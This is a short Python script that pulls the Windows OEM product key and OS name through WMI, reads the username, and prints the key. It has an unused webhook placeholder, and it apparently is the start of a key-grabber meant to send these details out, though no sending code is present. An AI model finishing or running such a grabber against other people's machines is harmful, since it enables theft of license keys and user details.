import subprocess
import os
import requests

def Main():
    WEBHOOK = 'Webhook-Here'
    NAME = os.getenv("UserName")
    KEY = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
    KEY_TYPE = subprocess.check_output('wmic os get Caption').decode().split('\n')[1].strip()
    if KEY == '':
        KEY = 'Not Avaliable'
    else:
        pass   
    print({KEY})

if __name__ == "__main__":
    Main()